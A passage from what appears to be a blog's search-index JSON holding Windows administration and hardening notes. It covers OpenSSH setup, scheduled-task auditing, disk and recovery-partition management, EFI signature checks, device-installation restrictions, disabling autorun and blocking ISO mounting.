-StartupType 'Automatic'\n\n# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify\nif (!(Get-NetFirewallRule -Name \"OpenSSH-Server-In-TCP\" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {\n    Write-Output \"Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it...\"\n    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22\n} else {\n    Write-Output \"Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists.\"\n}\n</code></pre> <p>Change the following in <code>C:\\ProgramData\\ssh\\sshd_config</code>: <pre><code>#PasswordAuthentication Yes\n</code></pre> To: <pre><code>PasswordAuthentication no\n</code></pre></p> <p>Place public key data into: <pre><code>C:\\Users\\$USER\\.ssh\\authorized_keys\nC:\\ProgramData\\ssh\\administrators_authorized_keys\n</code></pre></p> <p>Like on Unix systems, the permissions must be correct on the authorized_key files. See the following page on the Win32-OpenSSH Wiki for detailed descriptions:</p> <p>https://github.com/PowerShell/Win32-OpenSSH/wiki/Security-protection-of-various-files-in-Win32-OpenSSH</p> <p>Then, if the user you'll be logging in as IS NOT an administrator: <pre><code>takeown.exe /F .\\authorized_keys /S $HOSTNAME /U $USER\nicacls.exe .\\authorized_keys /reset\nicacls.exe .\\authorized_keys /inheritance:r\nicacls.exe .\\authorized_keys /grant $USER:\"(F)\"\n</code></pre></p> <p>or if the user you'll be logging in as IS an administrator: <pre><code>icacls.exe .\\authorized_keys /reset\nicacls.exe .\\administrators_authorized_keys /inheritance:r\nicacls.exe .\\administrators_authorized_keys /grant SYSTEM:\"(F)\"\nicacls.exe .\\administrators_authorized_keys /grant BUILTIN\\Administrators:\"(F)\"\n</code></pre></p> <ol> <li>Applying Configuration Changes</li> </ol> <p>Anytime you update or modify <code>C:\\ProgramData\\ssh\\sshd_config</code>, be sure to restart the <code>sshd</code> service so that it reads and loads the latest changes:</p> <pre><code>Restart-Service sshd\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>List all scheduled tasks by creation date:</p> <pre><code>Get-ScheduledTask -TaskName * | Select -Property Date,Author,Taskname | Sort-Object -Property Date\n</code></pre> <p>View scheduled tasks' creation date in the GUI:</p> <p>Task Scheduler &gt; Task Scheduler (Local) &gt; Task Scheduler Library &gt; [TaskName] &gt; Created</p> <p>Autoruns will also quickly identify any scheduled tasks in the <code>Scheduled Tasks</code> tab.</p> <ul> <li>Hide: Windows Entries</li> <li>Hide: Microsoft Entries</li> </ul> <p>https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#log-audit-task-creation","title":"Log &amp; Audit Task Creation","text":"<p>https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698#security-monitoring-recommendations</p> <p>Using the GUI:</p> <p>Run <code>gpedit.msc</code></p> <p><code>Local Computer Policy &gt; Windows Settings &gt; Security Settings &gt; Advanced Audit Policy Configuration &gt; Object Access &gt; Audit Other Object Access Events</code></p> <p>Choose <code>Configure the following audit events</code></p> <p>Choose <code>Success</code>, then <code>Apply</code> and <code>OK</code></p> <p>Now you can query the event logs for occurances of scheduled task creation:</p> <pre><code>Get-WinEvent -LogName \"Security\" | Where Id -eq \"4698\"\nGet-WinEvent -LogName \"Security\" | Where Id -eq \"4698\" | Select -Property *\n</code></pre> <p>TO DO: Configure scheduled task creation auditing using only PowerShell</p> <p>You can locate registry items just like searching the filesystem.</p> <p>We know the policy for scheduled task logging is related to \"Object Access\":</p> <pre><code>Get-ChildItem -Path \"HKLM:\\SOFTWARE\\Microsoft\\*object*access*\" -Recurse -ErrorAction SilentlyContinue\n</code></pre> <p>After a possible delay while it searches, you should find it at this path, and be able to check it's values:</p> <pre><code>Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Audit\\ObjectAccess_AuditOtherObjectAccessEvents\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#wmi","title":"WMI","text":"<ul> <li>Intro to SOC: Windows CLI</li> <li>Hacktricks: CMD</li> <li>Hacktricks: PowerShell</li> <li>PayloadsAllTheThings: PowerShell</li> <li>PayloadsAllTheThings: WMI Event Subscription</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#disk-management","title":"Disk Management","text":"<p>This SuperUser answer by user VainMan is an excellent walkthrough of managing disks with just built in Windows tools:</p> <ul> <li>SuperUser: How to Move the Recovery Partition on Windows 10<ul> <li>https://stackoverflow.com/legal/terms-of-service#licensing</li> <li>This section is released under the same CC-BY-SA-4.0 license as the original post.</li> </ul> </li> </ul> <p>PowerShell Cmdlets:</p> <ul> <li>Get-Disk</li> <li>Set-Disk</li> <li>List of All Storage Cmdlets</li> </ul> <p>Additional documentation for this section:</p> <ul> <li>Microsoft Docs: Capture and Apply the System and Recovery Partitions</li> <li><code>diskpart.exe</code></li> <li><code>dism.exe</code></li> <li><code>reagentc.exe</code></li> <li><code>mountvol.exe</code></li> <li><code>diskmgmt.mmc</code></li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#mount-and-unmount-volumes-and-drives-gui","title":"Mount and Unmount Volumes and Drives (GUI)","text":"<p>The default external storage removal policy in recent versions of Windows (since Windows 10 1809) is Quick removal.</p> <p>See: <code>diskmgmt.msc</code> &gt; Right-Click the Disk number, select <code>Properties</code> &gt; Policies Tab</p> <ul> <li>Quick removal: You can remove the device without using the \"Safely Remove Hardware\" process</li> <li>Better performance: Improved system resource usage, data is cached but you will need to use \"Safely Remove Hardware\" to avoid data loss</li> </ul> <p>Set a Drive to Offline:</p> <ul> <li>Also in the <code>diskmgmt.msc</code> window, Right-Click the Disk number</li> <li>Select <code>Offline</code> to take the drive offline</li> <li>This unmounts the drive, and prevents accidental writes or access</li> <li>You can also use <code>Set-Drive</code> to take a disk offline or make it read-only</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#mount-and-unmount-volumes-and-drives-cli","title":"Mount and Unmount Volumes and Drives (CLI)","text":"<p>This is functionally the equivalent of using <code>diskmgmt.mmc</code> in any of the following ways:</p> <ul> <li>Create a new simple volume from unallocated space, or format an external drive and assigning it a drive letter</li> <li>Unmounting the drive (removing the drive letter)</li> <li>Deleting the volume altogether</li> </ul> <p>Get the <code>VolumeName</code> of the <code>G:</code> drive: <pre><code>mountvol.exe G: /L\n     \\\\?\\Volume{12345678-abcd-efab-cdef-01234567890a}\\\n</code></pre></p> <p>Unmount the <code>G:</code> drive <pre><code>mountvol.exe G: /P\n</code></pre></p> <ul> <li>The volume will still exist</li> <li>The mount point will no longer be traversable since there's no longer an assigned drive letter</li> <li><code>Get-ItemProperty -Path \"HKLM:\\SYSTEM\\MountedDevices\"</code> will show a <code>#{GUID}</code> instead of <code>\\DosDevices\\G:</code></li> <li>Even if you assign the volume a new drive letter, it will know it's tied to the same <code>#{GUID}</code> and replace it with <code>\\DosDevices\\&lt;letter&gt;:</code></li> </ul> <p>Mount the volume to a new drive letter (quote the VolumeName string): <pre><code>mountvol.exe X: '\\\\?\\Volume{12345678-abcd-efab-cdef-01234567890a}\\'\n</code></pre></p> <p>Remove the volume, delete the volume (meaning all data on the volume), then clean up any leftover artifiacts in the registry</p> <ul> <li><code>Get-ItemProperty -Path \"HKLM:\\SYSTEM\\MountedDevices\"</code> will still show a <code>#{GUID}</code> after deleting a volume with any disk tool</li> <li>The deleted volume should still be visible in <code>diskmgmt.mmc</code> until you delete its registry entry, then close and open <code>diskmgmt.mmc</code> again</li> <li><code>mountvol.exe /R</code> will remove this registry entry once the volume no longer exists</li> <li>If the volume still exists, <code>mountvol.exe /R</code> will not remove the entry</li> <li>If you format the same volume again and mount it, you'll note it retains the same <code>#{GUID}</code> when unmounted</li> </ul> <pre><code>mountvol.exe G: /P\ndiskpart.exe\n&gt; list volume\n&gt; select Volume 1\n&gt; delete\n&gt; exit\nmountvol.exe /R\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#extend-the-c-drive","title":"Extend the C Drive","text":"<p>Extending the C drive isn't intuitive because the partition the OS is installed on is sandwiched between the boot and recovery partitions. Even if you have free space (say on a newly extended VM or on a dual boot machine where you're removing the other OS) you cannot extend the installed partition without moving the recovery partition.</p> <p>This entire example essentially mirrors the SuperUser answer linked above, with only small additions or changes to focus on backing up the recovery partition, deleting it so that the <code>C:</code> partition can be extended, then appending the backup recovery partition image to the new end of the <code>C:</code> partition.</p> <p>Mount the recovery partition <pre><code>diskpart\nlist disk\nselect disk &lt;disk&gt;\nlist partition\nselect partition &lt;partition&gt;\nassign letter=R\nexit\n</code></pre> Create an image file with the <code>dd</code>-like <code>dism.exe</code> utility: <pre><code>dism /Capture-Image /ImageFile:C\\recovery-partition.wim /CaptureDir:R:\\ /Name:\"Recovery\"\n</code></pre></p> <p>Delete the current recovery partition: <pre><code>diskpart\nselect volume R\ndelete partition override\nexit\n</code></pre></p> <ul> <li>Extend the <code>C:\\</code> drive in Disk Management</li> <li>Create a new volume (+ new drive letter)</li> <li>Apply the recovery image to the new volume using the new drive letter</li> </ul> <pre><code>dism /Apply-Image /ImageFile:C:\\recovery-partition.wim /Index:1 /ApplyDir:R:\\\n</code></pre> <p>Register the new recovery location <pre><code>reagentc /disable\nreagentc /setreimage /path R:\\Recovery\\WindowsRE\nreagentc /enable\n</code></pre></p> <p>Unmount that drive letter to return the recovery partition to a 'hidden' state <pre><code>diskpart\nselect volume R\nremove\nexit\n</code></pre></p> <ul> <li>You'll be able to see in Disk Management the Recovery (or whatever you named it) partition loses it's new drive letter</li> </ul> <p>Optionally: - Confirm the recovery partition is working with <code>reagentc /info</code> - Boot into recovery <code>reagentc /boottore /logfile C:\\Temp\\Reagent.log</code> - Delete the recovery image file <code>del C:\\recovery-image.wim</code></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#prevent-automatic-mounting-of-new-volumes","title":"Prevent Automatic Mounting of New Volumes","text":"<p>NOTE: this still needs tested, and does not appear to work as expected.</p> <p>This is useful in forensics where you want to connect an external drive but do not want to mount or open the filesystem.</p> <p>On Windows Server, this is a built in utility: <code>automount</code>.</p> <p>On a Windows workstation, you must use <code>mountvol.exe</code>.</p> <p>Disables automatic mounting of new basic volumes. New volumes are not mounted automatically when added to the system. <pre><code>mountvol.exe /N\n</code></pre></p> <ul> <li>Now <code>mountvol.exe /?</code> will print a message at the bottom of the usage information noting if automatic mounting is disabled</li> </ul> <p>Re-enables automatic mounting of new basic volumes. <pre><code>mountvol.exe /E\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#efi-partition","title":"EFI Partition","text":"<p>This mounts the <code>\\EFI</code> partiton under <code>E:\\</code> if it's available (you can use any available drive letter). <pre><code>mountvol.exe E: /S\n</code></pre></p> <p>If you want to review the 10 most recently modified files in the EFI partition mounted at <code>E:\\</code>: <pre><code>gci E:\\EFI -Recurse -Force -File | sort LastWriteTime -Descending | Select -First 10 FullName,LastWriteTime 2&gt;$nul\n</code></pre></p> <p>Get a list of all filetypes found in <code>E:\\EFI</code>: <pre><code>gci E:\\EFI -Recurse -Force -File | sort LastWriteTime -Descending | Group-Object Extension 2&gt;$nul\n</code></pre></p> <p>Check the signature of every file in <code>E:\\EFI</code>, using <code>C:\\Tools\\sigcheck64.exe</code>: <pre><code>foreach ($efi_file in (gci E:\\ -Recurse -Force -File).FullName) { if (C:\\Tools\\sigcheck64.exe -accepteula $efi_file | Select-String \"^\\s+Verified:\\s+Signed$\") { Write-Host -ForegroundColor GREEN \"[OK]$efi_file\" } else { Write-Host -ForegroundColor RED \"[WARNING]$efi_file\" } }\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#device-management","title":"Device Management","text":"<p>Restricting device and driver installation.</p> <ul> <li>Manage Device Installation with Group Policy</li> <li>System Defined Device Setup Classes Available to Vendors</li> <li>System Defined Device Setup Classes Reserved for System Use</li> <li>USB Device Descriptors</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#device-id-strings","title":"Device ID Strings","text":"<p>https://learn.microsoft.com/en-us/windows/client-management/manage-device-installation-with-group-policy#determine-device-identification-strings</p> <p>The <code>Class GUID</code> is the type of device, for example a printer or a tablet.</p> <p>The <code>Instance ID</code>, <code>Hardware IDs</code>, and <code>Compatible IDs</code> are identifiers for the device. The most specific is the <code>Instance ID</code>. This relates to that one device, and individual devices may have multiple <code>Instance ID</code>s. You'll need these ID's to 'allow' or 'deny' devices.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enum-device-id-strings-cmdexe","title":"Enum Device ID Strings (cmd.exe)","text":"<p>You can start like this from a command prompt with <code>pnputil</code>:</p> <pre><code>pnputil /enum-devices /connected\n</code></pre> <p>If you were trying to find a single device, scroll through the list to determine the possible <code>Class GUID</code> of the device you're looking for.</p> <p>Next you'd query connected devices of that class. This should narrow down the results enough for you to identify the exact device.</p> <pre><code>pnputil /enum-devices /connected /class '{&lt;guid&gt;}'\n</code></pre> <p>In this case, the <code>Device Description</code> fields most closely matching and describing your device are usually the right ones.</p> <p>Finally, query the device directly using the <code>Instance ID</code> (there may be multiple <code>Instand ID</code>s for the same device, query each one you find) and this time also print the <code>Hardware IDs</code> and <code>Compatible IDs</code> for each instance:</p> <pre><code>pnputil /enum-devices /instanceid '&lt;instance-id&gt;' /ids\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enum-device-id-strings-powershell","title":"Enum Device ID Strings (PowerShell)","text":"<p>All the credit for this one goes to the PowerShell Team over on the Microsoft DevBlogs:</p> <ul> <li>Displaying USB Devices Using WMI</li> </ul> <p>This will gather all of your connected USB devices in a single line:</p> <pre><code>Get-WmiObject Win32_USBControllerDevice | %{[wmi]($_.Dependent)} | Sort-Object Description,DeviceID | ft Description,DeviceID -auto\n</code></pre> <p>We can append <code>ClassGuid</code>, <code>HardwareID</code>, and or <code>CompatibleID</code> onto an <code>fl</code> instead of an <code>ft</code> command to obtain the other IDs as well:</p> <pre><code>Get-WmiObject Win32_USBControllerDevice | %{[wmi]($_.Dependent)} | Sort-Object Description,DeviceID | fl Description,DeviceID,ClassGuid,HardwareID,CompatibleID\n</code></pre> <p>In any case, you'll want to note the <code>Instance ID</code>, <code>Hardware IDs</code>, and <code>Compatible IDs</code> for use with policy configuration.</p> <p>As mentioned in #3 of Scenario steps - preventing installation of prohibited devices, be sure you know exactly what will be blocked by the policy before deploying it. It's recommended to test all of this in a VM, as you can quickly recover from a policy that's too broad (which could block all external devices preventing you from using or recovering the machine).</p> <p>Devices are evaluated by the <code>Apply layered order of evaluation for Allow and Prevent device installation policies across all device match criteria</code> policy in the following order:</p> <ul> <li>Device Instance IDs</li> <li>Device IDs (hardware / compatible)</li> <li>Device Setup Class</li> <li>Removeable Devices</li> </ul> <p><code>Device Instance IDs</code> are the most specific and always take precedence.</p> <p>To allow only trusted devices while defaulting to blocking all others:</p> <ul> <li>Enter the ID's of devices you wish to allow under <code>Allow installation of devices that match any of these device instance IDs</code> and enable this policy</li> <li>Set <code>Apply layered order of evaluation for Allow and Prevent device installation policies across all device match criteria</code> policy to enable</li> <li>Enabled the <code>Prevent installation of removable devices</code> policy</li> </ul> <p>Alternatively, and as a test, if you wish to block specific devices while allowing all by default:</p> <ul> <li>Enable the <code>Prevent installation of devices that match any of these device instance IDs</code> policy to block specific Instance IDs (precise)</li> <li>Enable the <code>Prevent installation of devices that match any of these device IDs</code> policy to block based on Hardware or Compatible IDs (broad)</li> <li>Click <code>Show</code> and add the IDs to this list</li> <li>Check <code>Also apply to matching devices that are already installed</code></li> </ul> <p>What the last point will do is disconnect any currently connected device(s) matching the policy and remove their drivers. In Windows 11 this will happen immediately after applying the policy.</p> <p>Remember you may need to specify multiple <code>Instance IDs</code> even for one device.</p> <p>You can confirm the devices are no longer visible with:</p> <pre><code>pnputil.exe /enum-devices /connected /class '{&lt;guid&gt;}'\n</code></pre> <p>Disabling or setting that policy to Not Configured will reconnect the devices.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#deny-execute-access-disable-autorun","title":"Deny Execute Access, Disable Autorun","text":"<p>By default, Windows will automatically mount any external drives connected. However, these settings will prevent them from executing any content. AutoPlay typically loads media or external files automatically based on a user setting. Autoruns (since Vista) execute content from an <code>autorun.inf</code> file. These files should require user interaction.</p> <p>In the following GPO path:</p> <pre><code>Local Computer Policy &gt; Administrative Templates &gt; System &gt; Removable Storage Access\n</code></pre> <p>The following policies control whether content can execute at all from removable media.</p> <ul> <li>CD and DVD: Deny execute access</li> <li>Floppy Drives: Deny execute access</li> <li>Removable Disks: Deny execute access</li> <li>All Available Storage Classes: Deny execute access</li> <li>Tape Drives: Deny execute access</li> </ul> <p>Next, in this GPO path:</p> <pre><code>Local Computer Policy &gt; Administrative Templates &gt; Windows Components &gt; AutoPlay Policies\n</code></pre> <p>These settings control Autorun and AutoPlay features.</p> <ul> <li><code>Turn off Autoplay</code>: Enabled, CD-ROM and removable media drives</li> <li><code>Set the default behaivor for Autorun</code>: Enabled, Do not execute any autorun commands</li> <li><code>Disallow Autoplay for non-volume devices</code>: Enabled</li> </ul> <p>To set these items from PowerShell:</p> <pre><code># Per user, AutoPlay setting\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoplayHandlers\" -Name \"DisableAutoplay\" -Type DWord -Value 1\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enable-or-disable-pnp-devices","title":"Enable or Disable PnP Devices","text":"<p>stackoverflow: Enable / Disable Webcam with PowerShell</p> <p>Sometimes you won't be able to re-enable a previously disabled webcam through the settings menu. Instead enumerate cameras, then enable or disable them using their <code>InstanceId</code>.</p> <p>Enumerate known cameras.</p> <ul> <li>Disabled cameras have a status of <code>error</code></li> <li>Enabled cameras have a status of <code>OK</code></li> <li>Disconnected cameras have a status of <code>unknown</code></li> </ul> <pre><code>Get-PnpDevice -FriendlyName \"*cam*\" | select Status,FriendlyName,InstanceId | fl\nGet-PnpDevice -Class camera | select Status,FriendlyName,InstanceId | fl\n</code></pre> <p>Enable / Disable camera as administrator, you'll be prompted to confirm:</p> <pre><code>Enable-PnpDevice -InstanceId \"&lt;instanceid&gt;\"\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#blocking-iso-mounting","title":"Blocking ISO Mounting","text":"<p>Taken directly from Mubix's blog post:</p> <ul> <li>https://malicious.link/post/2022/blocking-iso-mounting/</li> </ul> <p>What this does:</p> <ul> <li>Block ISO mounting from double clicking</li> <li>Block ISO mounting via the context menu</li> <li>Block programmatic ISO mounting via PowerShell</li> </ul> <p>In the following GPO path:</p> <pre><code>Local Computer Policy &gt; Administrative Templates &gt; System &gt; Device Installation &gt; Device Installation Restrictions\n</code></pre> <p>Enable this policy:</p> <pre><code>Prevent installation of devices that match any of these device IDs\n</code></pre> <p>Check the \"Also apply to matching devices that are already installed\" option.</p> <p>And set this as a value:</p> <pre><code>SCSI\\CdRomMsft____Virtual_DVD-ROM_\n</code></pre> <p>Try to mount an ISO to validate this is working. All ISO files should fail to mount to the filesystem once this policy is in place.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#creating-an-iso-for-testing","title":"Creating an ISO for Testing","text":"<p>On Ubuntu the <code>genisoimage</code> command can quickly create an ISO of any folder or file:</p> <pre><code>genisoimage -o &lt;outfile&gt;.iso &lt;input-folder&gt;\ngenisoimage -o my-docs.iso ./Documents\n</code></pre> <p>You can verify the ISO and contents with:</p> <pre><code>file ./my-docs.iso\n\nsudo mkdir /mnt/my-iso\nsudo mount my-docs.iso /mnt/my-iso\n\nls -l /mnt/my-iso\n\nsudo umount /mnt/my-iso\nsudo rm -rf /mnt/my-iso\n</code></pre> <p>Now move the <code>.iso</code> file over to your Windows machine (or if you did this in WSL it's already there) to confirm your policy configurations are working.</p> <p>Additional Use Cases</p> <ul> <li> <p>Allow only authorized USB device(s), block all other USB devices</p> </li> <li> <p>Block a specific device from being installed</p> </li> </ul> <p>TO DO: how to configure these policies with just PowerShell</p>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/archive/2023/","title":"2023","text":""},{"location":"blog/archive/2022/","title":"2022","text":""},{"location":"blog/archive/2019/","title":"2019","text":""}]}